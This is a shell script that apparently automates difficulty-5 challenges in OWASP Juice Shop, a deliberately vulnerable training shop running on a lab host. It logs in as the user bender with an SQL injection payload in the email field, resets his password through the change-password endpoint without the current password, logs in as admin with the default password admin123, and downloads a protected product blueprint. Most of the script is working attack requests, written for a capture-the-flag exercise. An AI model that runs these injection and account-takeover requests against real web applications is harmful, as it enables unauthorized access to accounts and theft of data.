#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.77.180"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null


# Initiate session and cookies
echo "5.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/5-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/5-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/5-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/5-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/5-cookies.txt


# Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password
echo "5.3 - CHANGE BENDER'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/5-bender.json
BENDER_TOKEN=$(jq -r '.authentication.token' $result_folder/5-bender.json)
echo "--> Authenticated as bender with token $(echo "$BENDER_TOKEN" | cut -c 1-20)...."
cp $result_folder/5-cookies.txt $result_folder/5-bender-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BENDER_TOKEN" >> $result_folder/5-bender-cookies.txt
curl -s -X GET "http://$target_ip/rest/user/change-password?current=&new=slurmCl4ssic&repeat=slurmCl4ssic" -b "$result_folder/5-bender-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${BENDER_TOKEN}" -L -o /dev/null




# Deprive the shop of earnings by downloading the blueprint for one of its products.
echo "5.13 - RETRIEVE BLUEPRINT"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/5-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/5-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/5-cookies.txt $result_folder/5-admin-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/5-admin-cookies.txt
# Being able to retrieve the 19px image is what changes the challenge status to solved....
curl -s -X GET "http://$target_ip/assets/public/images/products/JuiceShop.stl" -b "$result_folder/5-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/5-product.stl


# Compute score
echo "5.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/5-cookies.txt" -L -o $result_folder/5-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 5 and .solved == true)] | length' $result_folder/5-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 5 and .solved != null)] | length' $result_folder/5-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"